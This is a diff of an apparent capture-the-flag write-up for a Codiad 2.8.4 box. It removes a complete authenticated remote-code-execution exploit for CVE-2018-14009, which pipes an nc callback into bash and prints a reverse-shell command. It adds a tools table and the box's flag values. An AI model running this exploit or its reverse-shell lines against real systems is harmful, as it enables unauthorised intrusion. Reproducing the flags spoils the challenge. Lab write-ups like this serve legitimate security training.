@@ -127,131 +127,7 @@ username=john&password=password&theme=default&language=en
 
 ### Exploit
 
-`49902.py` was modified to drop the PowerShell payload and replace it with a `nc` pipe — cleaner for Linux targets and avoids the PowerShell dependency entirely:
-
-```python
-# Exploit Title: Codiad 2.8.4 - Remote Code Execution (Authenticated)
-# Discovery by: WangYihang
-# Vendor Homepage: http://codiad.com/
-# Software Links : https://github.com/Codiad/Codiad/releases
-# Tested Version: Version: 2.8.4
-# CVE: CVE-2018-14009
-
-#!/usr/bin/env python
-# encoding: utf-8
-import requests
-import sys
-import json
-session = requests.Session()
-
-def login(domain, username, password):
-    global session
-
-    url = domain + "/components/user/controller.php?action=authenticate"
-    data = {
-        "username": username,
-        "password": password,
-        "theme": "default",
-        "language": "en"
-    }
-
-    response = session.post(url, data=data, verify=False)
-    content = response.text
-
-    print("[+] Login Content : %s" % (content))
-
-    if 'status":"success"' in content:
-        return True
-    
-def get_write_able_path(domain):
-    global session
-    
-    url = domain + "/components/project/controller.php?action=get_current"
-    response = session.get(url, verify=False)
-    content = response.text
-    
-    print("[+] Path Content : %s" % (content))
-    json_obj = json.loads(content)
-    
-    if json_obj['status'] == "success":
-        return json_obj['data']['path']
-    else:
-        return False
-    
-def exploit(domain, host, port, path):
-    global session
-    url = domain + \
-        "components/filemanager/controller.php?type=1&action=search&path=%s" % (
-            path)
-    
-    # payload = '''SniperOJ%22%0A%2Fbin%2Fbash+-c+'sh+-i+%3E%26%2Fdev%2Ftcp%2F''' + host + '''%2F''' + port + '''+0%3E%261'%0Agrep+%22SniperOJ'''
-    payload = '"%%0Anc %s %d|/bin/bash %%23' % (host, port)
-    payload = "search_string=Hacker&search_file_type=" + payload
-    headers = {
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}
-    response = session.post(url, data=payload, headers=headers, verify=False)
-    content = response.text
-    print(content)
-
-def promote_yes(hint):
-    print(hint)
-    while True:
-        ans = input("[Y/n] ").lower()
-        if ans == 'n':
-            return False
-        elif ans == 'y':
-            return True
-        else:
-            print("Incorrect input")
-
-def main():
-    if len(sys.argv) != 6:
-        print("Usage : ")
-        print("        python %s [URL] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0]))
-        print("        python %s [URL:PORT] [USERNAME] [PASSWORD] [IP] [PORT]" % (sys.argv[0]))
-        print("Example : ")
-        print("        python %s http://localhost/ admin admin 8.8.8.8 8888" % (sys.argv[0]))
-        exit(1)
-
-    domain = sys.argv[1]
-    username = sys.argv[2]
-    password = sys.argv[3]
-    host = sys.argv[4]
-    port = int(sys.argv[5])
-
-    print("[+] Please execute the following command on your vps: ")
-    print("echo 'bash -c \"bash -i >/dev/tcp/%s/%d 0>&1 2>&1\"' | nc -lnvp %d" % (host, port + 1, port))
-    print("nc -lnvp %d" % (port + 1))
-    if not promote_yes("[+] Please confirm that you have done the two command above [y/n]"):
-        exit(1)
-
-    print("[+] Starting...")
-    
-    if not login(domain, username, password):
-        print("[-] Login failed! Please check your username and password.")
-        exit(2)
-    
-    print("[+] Login success!")
-    print("[+] Getting writeable path...")
-    path = get_write_able_path(domain)
-    
-    if path == False:
-        print("[+] Get current path error!")
-        exit(3)
-    
-    print("[+] Writeable Path : %s" % (path))
-    print("[+] Sending payload...")
-
-    exploit(domain, host, port, path)
-
-    print("[+] Exploit finished!")
-    print("[+] Enjoy your reverse shell!")
-
-if __name__ == "__main__":
-    main()
-```
-
-The key change is the `exploit()` payload line. The `%0A` injects a newline into the `search_file_type` parameter, causing Codiad's file manager to execute `nc <host> <port>|/bin/bash` as a shell command. The `#` comments out everything after it. The original PowerShell variant is left commented out above for reference.
+`49902.py` was modified to drop the PowerShell payload and replace it with a `nc` pipe — cleaner for Linux targets and avoids the PowerShell dependency entirely.
 
 The exploit requires two listeners before execution — the first catches an nc callback and relays a bash reverse shell command back to the target; the second receives the resulting shell:
 
@@ -417,3 +293,25 @@ bash-4.4# cat /root/root.txt
 - `.bash_history` is regularly overlooked but frequently contains credentials; check it immediately when landing in any readable home directory
 - Writable systemd unit files with a sudo restart path are a clean privesc vector — `ExecStartPre` runs as root before the service starts, making it ideal for injecting one-shot commands like `chmod +s`
 - `systemctl daemon-reload` is required before `service restart` picks up a modified unit file — skipping it means the old definition runs and the exploit silently fails
+
+---
+
+## 🛠️ Tools Used
+
+| Tool | Purpose |
+| --- | --- |
+| `nmap` | Port and service enumeration |
+| `ftp` | Anonymous login, retrieve hidden credential note |
+| `ffuf` | Directory bruteforce |
+| `searchsploit` | Locate Codiad 2.8.4 RCE exploit |
+| Python exploit | CVE-2018-14009 Codiad authenticated RCE via search string injection |
+| `nc` | Reverse shell listener and relay |
+| `python3` | Shell stabilisation (pty.spawn) |
+| `systemctl` | Reload modified vsftpd.service unit file |
+
+## 🚩 Flags
+
+| Flag | Value |
+| --- | --- |
+| `user.txt` | `02930d21a8eb009f6d26361b2d24a466` |
+| `root.txt` | `ce258cb16f47f1c66f0b0b77f4e0fb8d` |
